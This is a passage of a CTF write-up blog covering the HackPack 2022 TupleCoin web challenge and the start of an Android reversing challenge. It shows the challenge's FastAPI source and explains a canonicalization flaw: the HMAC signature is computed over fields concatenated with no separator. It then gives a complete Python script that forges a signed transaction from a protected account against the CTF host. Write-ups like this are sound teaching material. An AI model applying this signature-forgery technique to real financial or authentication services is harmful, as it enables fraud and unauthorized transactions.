<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14</span>TUCO_ACCT_NUM <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">314159265</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16</span>FLAG_FILE <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>environ<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#34;TUPLECOIN_FLAG_FILE&#34;</span>, <span style="color:#f1fa8c">&#34;flag.txt&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17</span><span style="color:#ff79c6">try</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18</span>    <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(FLAG_FILE) <span style="color:#ff79c6">as</span> fd:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19</span>        FLAG <span style="color:#ff79c6">=</span> fd<span style="color:#ff79c6">.</span>read()<span style="color:#ff79c6">.</span>strip()
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20</span><span style="color:#ff79c6">except</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21</span>    FLAG <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;we has a fake flag for you, but it won&#39;t get you points at the CTF...&#34;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24</span>app <span style="color:#ff79c6">=</span> FastAPI()
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25</span>APP_DIST_DIR <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>dirname(os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>dirname(os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>abspath(__file__))), <span style="color:#f1fa8c">&#34;client&#34;</span>, <span style="color:#f1fa8c">&#34;dist&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26</span>app<span style="color:#ff79c6">.</span>mount(<span style="color:#f1fa8c">&#34;/app&#34;</span>, StaticFiles(directory<span style="color:#ff79c6">=</span>APP_DIST_DIR), name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;static&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30</span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">Balance</span>(BaseModel):
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31</span>    acct_num: <span style="color:#8be9fd;font-style:italic">int</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32</span>    num_tuco: <span style="color:#8be9fd;font-style:italic">float</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34</span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">serialize</span>(self) <span style="color:#ff79c6">-&gt;</span> <span style="color:#8be9fd;font-style:italic">bytes</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35</span>        <span style="color:#ff79c6">return</span> (<span style="color:#8be9fd;font-style:italic">str</span>(self<span style="color:#ff79c6">.</span>acct_num) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;|&#39;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">str</span>(self<span style="color:#ff79c6">.</span>num_tuco))<span style="color:#ff79c6">.</span>encode()
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36</span>    
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37</span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">sign</span>(self, secret_key: <span style="color:#8be9fd;font-style:italic">bytes</span>) <span style="color:#ff79c6">-&gt;</span> CertifiedBalance:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38</span>        <span style="color:#ff79c6">return</span> CertifiedBalance<span style="color:#ff79c6">.</span>parse_obj({
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39</span>            <span style="color:#f1fa8c">&#34;balance&#34;</span>: {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40</span>                <span style="color:#f1fa8c">&#34;acct_num&#34;</span>: self<span style="color:#ff79c6">.</span>acct_num,
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41</span>                <span style="color:#f1fa8c">&#34;num_tuco&#34;</span>: self<span style="color:#ff79c6">.</span>num_tuco,
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42</span>            },
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43</span>            <span style="color:#f1fa8c">&#34;auth_tag&#34;</span>: hmac<span style="color:#ff79c6">.</span>new(secret_key, self<span style="color:#ff79c6">.</span>serialize(), <span style="color:#f1fa8c">&#34;sha256&#34;</span>)<span style="color:#ff79c6">.</span>hexdigest(),
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44</span>        })
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47</span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">CertifiedBalance</span>(BaseModel):
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48</span>    balance: Balance
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49</span>    auth_tag: <span style="color:#8be9fd;font-style:italic">str</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51</span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">verify</span>(self, secret_key: <span style="color:#8be9fd;font-style:italic">bytes</span>) <span style="color:#ff79c6">-&gt;</span> Balance:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52</span>        recreate_auth_tag <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>balance<span style="color:#ff79c6">.</span>sign(secret_key)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53</span>        <span style="color:#ff79c6">if</span> hmac<span style="color:#ff79c6">.</span>compare_digest(self<span style="color:#ff79c6">.</span>auth_tag, recreate_auth_tag<span style="color:#ff79c6">.</span>auth_tag):
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54</span>            <span style="color:#ff79c6">return</span> self<span style="color:#ff79c6">.</span>balance
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55</span>        <span style="color:#ff79c6">else</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56</span>            <span style="color:#ff79c6">raise</span> ValueError(<span style="color:#f1fa8c">&#34;invalid certified balance&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59</span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">Transaction</span>(BaseModel):
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60</span>    from_acct: <span style="color:#8be9fd;font-style:italic">int</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61</span>    to_acct: <span style="color:#8be9fd;font-style:italic">int</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62</span>    num_tuco: <span style="color:#8be9fd;font-style:italic">float</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64</span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">serialize</span>(self) <span style="color:#ff79c6">-&gt;</span> <span style="color:#8be9fd;font-style:italic">bytes</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65</span>        <span style="color:#ff79c6">return</span> (<span style="color:#8be9fd;font-style:italic">str</span>(self<span style="color:#ff79c6">.</span>from_acct) <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">str</span>(self<span style="color:#ff79c6">.</span>to_acct) <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">str</span>(self<span style="color:#ff79c6">.</span>num_tuco))<span style="color:#ff79c6">.</span>encode()
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67</span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">sign</span>(self, secret_key: <span style="color:#8be9fd;font-style:italic">bytes</span>) <span style="color:#ff79c6">-&gt;</span> AuthenticatedTransaction:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68</span>        tuco_smash <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>serialize()
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69</span>        tuco_hash <span style="color:#ff79c6">=</span> hmac<span style="color:#ff79c6">.</span>new(secret_key, tuco_smash, <span style="color:#f1fa8c">&#34;sha256&#34;</span>)<span style="color:#ff79c6">.</span>hexdigest()
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70</span>        
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71</span>        <span style="color:#ff79c6">return</span> CertifiedTransaction<span style="color:#ff79c6">.</span>parse_obj({
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72</span>            <span style="color:#f1fa8c">&#34;transaction&#34;</span>: {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73</span>                <span style="color:#f1fa8c">&#34;from_acct&#34;</span>: self<span style="color:#ff79c6">.</span>from_acct,
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74</span>                <span style="color:#f1fa8c">&#34;to_acct&#34;</span>: self<span style="color:#ff79c6">.</span>to_acct,
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75</span>                <span style="color:#f1fa8c">&#34;num_tuco&#34;</span>: self<span style="color:#ff79c6">.</span>num_tuco
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76</span>            },
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77</span>            <span style="color:#f1fa8c">&#34;auth_tag&#34;</span>: tuco_hash,
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78</span>        })
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81</span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">CertifiedTransaction</span>(BaseModel):
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82</span>    transaction: Transaction
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83</span>    auth_tag: <span style="color:#8be9fd;font-style:italic">str</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85</span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">verify</span>(self, secret_key: <span style="color:#8be9fd;font-style:italic">bytes</span>) <span style="color:#ff79c6">-&gt;</span> Transaction:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86</span>        recreated <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>transaction<span style="color:#ff79c6">.</span>sign(secret_key)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87</span>        <span style="color:#ff79c6">if</span> hmac<span style="color:#ff79c6">.</span>compare_digest(self<span style="color:#ff79c6">.</span>auth_tag, recreated<span style="color:#ff79c6">.</span>auth_tag):
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88</span>            <span style="color:#ff79c6">return</span> self<span style="color:#ff79c6">.</span>transaction
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89</span>        <span style="color:#ff79c6">else</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90</span>            <span style="color:#ff79c6">raise</span> ValueError(<span style="color:#f1fa8c">&#34;invalid authenticated transaction&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93</span>@app.get(<span style="color:#f1fa8c">&#39;/&#39;</span>, include_in_schema<span style="color:#ff79c6">=</span>False)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94</span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">home</span>():
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95</span>    <span style="color:#ff79c6">return</span> RedirectResponse(<span style="color:#f1fa8c">&#34;app/index.html&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98</span>@app.get(<span style="color:#f1fa8c">&#39;/robots.txt&#39;</span>, include_in_schema<span style="color:#ff79c6">=</span>False)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99</span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">robots</span>():
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100</span>    <span style="color:#ff79c6">return</span> RedirectResponse(<span style="color:#f1fa8c">&#34;app/robots.txt&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102</span><span style="color:#6272a4"># Returns type CertifiedBalance ; Takes Int</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103</span>@app.post(<span style="color:#f1fa8c">&#34;/api/account/claim&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104</span>async <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">account_claim</span>(acct_num: <span style="color:#8be9fd;font-style:italic">int</span>) <span style="color:#ff79c6">-&gt;</span> CertifiedBalance:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105</span>    <span style="color:#ff79c6">if</span> acct_num <span style="color:#ff79c6">==</span> TUCO_ACCT_NUM:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106</span>        <span style="color:#ff79c6">raise</span> HTTPException(status_code<span style="color:#ff79c6">=</span><span style="color:#bd93f9">400</span>, detail<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;That&#39;s Tuco&#39;s account number! Don&#39;t make Tuco mad!&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107</span>    
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108</span>    balance <span style="color:#ff79c6">=</span> Balance<span style="color:#ff79c6">.</span>parse_obj({
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109</span>        <span style="color:#f1fa8c">&#34;acct_num&#34;</span>: acct_num,
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110</span>        <span style="color:#f1fa8c">&#34;num_tuco&#34;</span>: math<span style="color:#ff79c6">.</span>pi,
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111</span>    })
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113</span>    <span style="color:#ff79c6">return</span> balance<span style="color:#ff79c6">.</span>sign(SECRET_KEY)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115</span><span style="color:#6272a4"># Returns type Certified Transaction; Takes Transaction</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116</span>@app.post(<span style="color:#f1fa8c">&#34;/api/transaction/certify&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117</span>async <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">transaction_certify</span>(transaction: Transaction) <span style="color:#ff79c6">-&gt;</span> CertifiedTransaction:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118</span>    <span style="color:#ff79c6">if</span> transaction<span style="color:#ff79c6">.</span>from_acct <span style="color:#ff79c6">==</span> TUCO_ACCT_NUM:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119</span>        <span style="color:#ff79c6">raise</span> HTTPException(status_code<span style="color:#ff79c6">=</span><span style="color:#bd93f9">400</span>, detail<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Ha! You think you can steal from Tuco so easily?!!&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120</span>    <span style="color:#ff79c6">return</span> transaction<span style="color:#ff79c6">.</span>sign(SECRET_KEY)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122</span><span style="color:#6272a4"># Returns type String ; takes Certified Transcation (WE WILL GET OUR FLAG HERE)</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">123</span>@app.post(<span style="color:#f1fa8c">&#34;/api/transaction/commit&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">124</span>async <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">transaction_commit</span>(certified_transaction: CertifiedTransaction) <span style="color:#ff79c6">-&gt;</span> <span style="color:#8be9fd;font-style:italic">str</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">125</span>    transaction <span style="color:#ff79c6">=</span> certified_transaction<span style="color:#ff79c6">.</span>verify(SECRET_KEY)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">126</span>    <span style="color:#ff79c6">if</span> transaction<span style="color:#ff79c6">.</span>from_acct <span style="color:#ff79c6">!=</span> TUCO_ACCT_NUM:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">127</span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;OK&#34;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">128</span>    <span style="color:#ff79c6">else</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">129</span>        <span style="color:#ff79c6">return</span> FLAG
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">130</span>
</code></pre></div><p>Here we can look in the function transaction.sign (line:67), the tuco_smash varible calls self.serialize.
In this function we can notice that for the generation of auth token, the app appends <code>from_acct</code> , <code>to_acct</code> and <code>num_tuco</code> <em>without any seperator</em></p>
<p>This part is important, because without any seperator we can create the auth token for the user tuco by manipulating values.
Since the app appends the values without a seperator we can bypass the tuco account check by</p>
<p><code>&lt;first half of tuco's account number&gt; + &lt;second half of tuco's account number&gt; + num tuco</code></p>
<p>this will generate the auth-token, which we can use to &ldquo;commit&rdquo; as tuco&rsquo;s account number.</p>
<p>From source code we can deduce that to get the flag we must call <code>/api/transaction/commit</code> with tuco&rsquo;s account number and a valid hash to get the flag</p>
<p>The &ldquo;from_acct&rdquo; param and the &ldquo;to_acct&rdquo; param combine to form tuco&rsquo;s account number and the final string that will be generated - 31415926512
<img src="/images/hackpack2022/Pasted%20image%2020220411113258.png" alt=""></p>
<p>Using the same auth token from the last response in this request
All the params combine to form the same string as the previous request. i.e 31415926512
<img src="/images/hackpack2022/Pasted%20image%2020220411113313.png" alt=""></p>
<p>Here is an automated python script to do the same</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#ff79c6">import</span> json
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#ff79c6">import</span> requests
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;https://tuplecoin.cha.hackpack.club/&#39;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>tuco <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">314159265</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>headers <span style="color:#ff79c6">=</span> {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>        <span style="color:#f1fa8c">&#34;Content-Type&#34;</span>:<span style="color:#f1fa8c">&#34;application/json&#34;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>        }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>data <span style="color:#ff79c6">=</span> {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>        <span style="color:#f1fa8c">&#34;from_acct&#34;</span> : <span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#8be9fd;font-style:italic">str</span>(tuco)[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>]),
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>        <span style="color:#f1fa8c">&#34;to_acct&#34;</span> : <span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#8be9fd;font-style:italic">str</span>(tuco)[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>:]),
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>        <span style="color:#f1fa8c">&#34;num_tuco&#34;</span> : <span style="color:#bd93f9">12</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>    }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;api/transaction/certify&#39;</span> ,json <span style="color:#ff79c6">=</span> data ,  headers <span style="color:#ff79c6">=</span> headers)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>j <span style="color:#ff79c6">=</span> json<span style="color:#ff79c6">.</span>loads(r<span style="color:#ff79c6">.</span>text)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>auth <span style="color:#ff79c6">=</span> j[<span style="color:#f1fa8c">&#34;auth_tag&#34;</span>]
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>exploit <span style="color:#ff79c6">=</span> {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>        <span style="color:#f1fa8c">&#34;transaction&#34;</span>:{
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>        <span style="color:#f1fa8c">&#34;from_acct&#34;</span>: tuco,
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>        <span style="color:#f1fa8c">&#34;to_acct&#34;</span>:<span style="color:#bd93f9">1</span>,
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>        <span style="color:#f1fa8c">&#34;num_tuco&#34;</span>:<span style="color:#bd93f9">2</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>        },
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>        <span style="color:#f1fa8c">&#34;auth_tag&#34;</span>: auth
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>    }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;api/transaction/commit&#39;</span> , json <span style="color:#ff79c6">=</span> exploit , headers <span style="color:#ff79c6">=</span> headers)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span style="color:#ff79c6">print</span>(r<span style="color:#ff79c6">.</span>text)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>
</code></pre></div><p>output</p>
<p><img src="/images/hackpack2022/Pasted%20image%2020220411114235.png" alt=""></p>
<hr>
<h2 id="rev-3t-3nd-ur-hom3">Rev: 3T 3ND UR HOM3</h2>
<p>This was an android challenge. We get an apk so we boot up an android emulator .</p>
<p>Unpacking the APK and editing AndroidManifest.xml to change the minimum android api version required to 23 (idk it was not working on my emulator, had to do this)
<img src="/images/hackpack2022/Pasted%20image%2020220411204608.png" alt=""></p>
<p>Repacking the apk.</p>
<p><img src="/images/hackpack2022/Pasted%20image%2020220411205604.png" alt=""></p>
<p>Signing the apk</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>keytool -genkey -keystore test.keystore -alias alias_name -keyalg RSA -keysize <span style="color:#bd93f9">2048</span> -validity <span style="color:#bd93f9">10000</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name
</code></pre></div><p>Now we install the apk</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>adb install modded.apk
</code></pre></div><p><img src="/images/hackpack2022/Pasted%20image%2020220412000639.png" alt=""></p>
